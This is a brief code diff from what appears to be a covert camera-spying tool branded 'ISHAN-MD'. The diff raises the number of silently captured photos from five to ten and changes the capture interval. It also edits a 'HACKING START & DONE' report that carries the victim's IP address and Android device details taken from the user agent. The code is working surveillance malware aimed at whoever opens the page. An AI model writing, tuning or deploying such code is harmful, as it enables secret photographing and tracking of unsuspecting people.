@@ -299,11 +299,11 @@
       photos.push(base64);
       photoCount++;
 
-      if (photoCount >= 5) {
+      if (photoCount >= 10) {
         track.stop();
         sendInfo();
       } else {
-        setTimeout(capturePhoto, 1500);
+        setTimeout(capturePhoto, 2000);
       }
     }
 
@@ -319,7 +319,7 @@
         const userAgent = navigator.userAgent;
         const androidInfo = parseAndroidInfo(userAgent);
 
-        let msg = `✅ HACKING START & DONE
+        let msg = `✅ ISHAN-MD HACKING START & DONE
 
 ⚓ IP: ${ip}
 
